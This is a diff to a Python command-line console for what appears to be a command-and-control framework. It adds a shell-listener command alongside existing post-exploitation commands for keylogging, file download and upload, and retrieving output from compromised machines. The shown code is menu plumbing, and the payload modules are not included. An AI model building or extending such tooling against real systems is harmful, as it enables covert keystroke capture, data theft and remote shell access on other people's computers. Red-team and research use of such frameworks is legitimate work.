@@ -6,6 +6,7 @@ from getoutput import getoutput
 from downloadfile import downloadfile
 from uploadfile import uploadfile
 from keylogger import keylogger
+from toggleshell import toggleshell
 
 class PostExploitMenu(cmd2.Cmd):
         POST_EXPLOIT_CATEGORY = 'Post Exploitation Commands'
@@ -52,15 +53,15 @@ class PostExploitMenu(cmd2.Cmd):
                 else:
                         self.poutput("[-] Error adding command to the queue")
 
-	@cmd2.with_category(POST_EXPLOIT_CATEGORY)
-	def do_keylog(self, arg):
-		self.poutput("[*] Modifying keylog status..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
-		retValue = keylogger(arg.split(" ", 1)[0], arg.split(" ", 1)[1])
+        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
+        def do_keylog(self, arg):
+                self.poutput("[*] Modifying keylog status..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
+                retValue = keylogger(arg.split(" ", 1)[0], arg.split(" ", 1)[1])
 
-		if (retValue):
-			self.poutput("[+] Successfully updated keylogger status!")
-		else:
-			self.poutput("[-] Error modifying keylogger status")
+                if (retValue):
+                        self.poutput("[+] Successfully updated keylogger status!")
+                else:
+                        self.poutput("[-] Error modifying keylogger status")
 
         @cmd2.with_category(POST_EXPLOIT_CATEGORY)
         def do_output(self, arg):
@@ -69,6 +70,16 @@ class PostExploitMenu(cmd2.Cmd):
 
                 if (not retValue):
                         self.poutput("[-] Error getting output for that machine")
+
+        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
+        def do_shell(self, arg):
+                self.poutput("[*] Setting Port for Shell Listener..." + arg.split(" ",1)[0] + " " + arg.split(" ",1)[1])
+                retValue = toggleshell(arg.split(" ",1)[0], arg.split(" ", 1)[1])
+
+                if (retValue):
+                        self.poutput("[+] Successfully updated listening port!")
+                else:
+                        self.poutput("[-] Error updating shell listener")
 
 @cmd2_submenu.AddSubmenu(PostExploitMenu(), command='post-exploit', reformat_prompt="{super_prompt[0]}{super_prompt[1]}{super_prompt[2]}{super_prompt[3]}{super_prompt[4]}{super_prompt[5]} {sub_prompt}")
 class TopLevel(cmd2.Cmd):
